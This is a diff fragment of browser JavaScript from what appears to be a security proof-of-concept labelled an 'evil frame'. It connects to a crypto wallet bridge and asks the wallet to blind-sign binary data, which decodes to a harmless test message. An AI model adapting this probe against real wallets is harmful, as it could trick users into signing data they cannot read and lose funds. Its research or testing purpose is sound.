@@ -13,7 +13,7 @@ b.connect(2,{manifestUrl:'https://goodman387.github.io/evil/manifest.json',items
   L('CONNECT_RESOLVED');
   s.textContent='PROBE:CONNECTED';
   var btn=document.createElement('button');btn.textContent='START SIGN-DATA binary';btn.style.cssText='font:20px monospace;padding:18px;width:100%;background:#fd0';
-  btn.onclick=function(){ s.textContent='PROBE:SIGN_SENT_WAIT_SHEET'; b.send({method:'signData',params:{type:'binary',bytes:'SGVsbG8gZnJvbSBldmlsIGZyYW1lIC0gcGxhaW50ZXh0IGluIGJpbmFyeSBibHVyLWJsdXJ5IHNpZ25pbmcgcHJvb2IgMjAyNi0wOS0wMw=='}}).then(function(res){s.textContent='PROBE:SIGNED_OK';L('SIGN RESULT '+JSON.stringify(res).slice(0,300));},function(e){s.textContent='PROBE:SIGN_ERR';L('SIGN ERR '+e);});
+  btn.onclick=function(){ s.textContent='PROBE:SIGN_SENT_WAIT_SHEET'; b.send({method:'signData',params:{id:1700000000000,type:'binary',bytes:'SGVsbG8gZnJvbSBldmlsIGZyYW1lIC0gcGxhaW50ZXh0IGluIGJpbmFyeSBibHVyLWJsdXJ5IHNpZ25pbmcgcHJvb2IgMjAyNi0wOS0wMw=='}}).then(function(res){s.textContent='PROBE:SIGNED_OK';L('SIGN RESULT '+JSON.stringify(res).slice(0,300));},function(e){s.textContent='PROBE:SIGN_ERR';L('SIGN ERR '+e);});
   };
   document.body.appendChild(btn);
 },function(e){L('CONNECT_REJ '+e);s.textContent='PROBE:CONNECT_REJECTED';});
